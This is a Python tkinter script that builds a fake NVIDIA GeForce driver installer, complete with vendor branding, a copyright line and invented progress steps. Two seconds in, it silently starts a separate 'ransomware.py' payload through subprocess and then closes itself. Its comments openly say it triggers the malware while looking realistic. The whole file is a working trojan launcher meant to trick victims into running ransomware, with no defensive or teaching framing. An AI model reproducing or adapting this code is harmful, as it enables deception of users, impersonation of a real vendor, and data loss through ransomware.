import tkinter as tk
from tkinter import ttk, messagebox
import time
import subprocess
import threading
import sys
import os

# Configuration
FAKE_APP_NAME = "NVIDIA GeForce Game Ready Driver 552.12"
RANSOMWARE_SCRIPT = "ransomware.py"

def run_fake_installer():
    root = tk.Tk()
    root.title(f"{FAKE_APP_NAME} Installer")
    root.geometry("500x350")
    root.resizable(False, False)
    root.configure(bg="#2c3e50") # Dark theme

    # Style
    style = ttk.Style()
    style.theme_use('clam')
    style.configure("TLabel", background="#2c3e50", foreground="white", font=("Segoe UI", 10))
    style.configure("TButton", background="#27ae60", foreground="white", font=("Segoe UI", 10, "bold"))
    style.configure("Horizontal.TProgressbar", background="#27ae60", troughcolor="#34495e", bordercolor="#2c3e50")

    # Header
    header_frame = tk.Frame(root, bg="#2c3e50")
    header_frame.pack(pady=20, padx=20, fill="x")
    
    lbl_title = tk.Label(header_frame, text=f"Installing {FAKE_APP_NAME}", font=("Segoe UI", 14, "bold"), bg="#2c3e50", fg="white")
    lbl_title.pack(anchor="w")
    
    lbl_subtitle = tk.Label(header_frame, text="Please wait while Setup installs necessary files on your system.\nThis may take several minutes.", justify="left", bg="#2c3e50", fg="white")
    lbl_subtitle.pack(anchor="w", pady=(5, 0))

    # Progress Section
    progress_frame = tk.Frame(root, bg="#2c3e50")
    progress_frame.pack(pady=30, padx=20, fill="x")

    lbl_status = tk.Label(progress_frame, text="Status: Extracting packages...", font=("Segoe UI", 9), bg="#2c3e50", fg="white")
    lbl_status.pack(anchor="w", pady=(0, 5))

    progress = ttk.Progressbar(progress_frame, orient="horizontal", length=400, mode="determinate", style="Horizontal.TProgressbar")
    progress.pack(fill="x")

    # Disclaimer / Footer
    lbl_footer = tk.Label(root, text="© 2024 NVIDIA Corporation. All rights reserved.", font=("Segoe UI", 8), fg="#95a5a6", bg="#2c3e50")
    lbl_footer.pack(side="bottom", pady=10)

    # Logic
    def start_installation():
        # Simulate installation steps
        steps = [
            "Checking system compatibility...", 
            "Extracting graphics driver...", 
            "Installing physics engine...", 
            "Configuring display settings...", 
            "Optimizing shader cache...",
            "Finalizing installation..."
        ]
        
        step_duration = 100 / len(steps)
        
        # TRIGGER THE MALWARE (Silently)
        # We start it after a small delay to make it look realistic
        root.after(2000, launch_malware)
        
        for step in steps:
            time.sleep(1.5) # Fake work
            # Check if window still exists before updating to avoid errors if closed
            try:
                lbl_status.config(text=f"Status: {step}")
                progress['value'] += step_duration
                root.update()
            except:
                break
        
        # "Crash" or Switch
        # Ideally, by now the ransomware GUI should have appeared on top.
        # We will close this installer to simulate the takeover.
        root.destroy()
        sys.exit()

    def launch_malware():
        # Execute the ransomware script in a separate process
        try:
            # Determine python executable
            python_exec = sys.executable
            # Must run ransomware.py from its OWN directory
            script_dir = os.path.dirname(os.path.abspath(__file__))
            script_path = os.path.join(script_dir, RANSOMWARE_SCRIPT)
            
            if os.path.exists(script_path):
                # We use subprocess.Popen to run it independently
                subprocess.Popen([python_exec, script_path], cwd=script_dir)
            else:
                messagebox.showerror("Error", f"Setup file missing: {script_path}")
        except Exception as e:
            print(f"Failed to launch payload: {e}")

    # Auto-start the fake installation in a thread so GUI doesn't freeze
    threading.Thread(target=start_installation, daemon=True).start()

    root.mainloop()

if __name__ == "__main__":
    run_fake_installer()
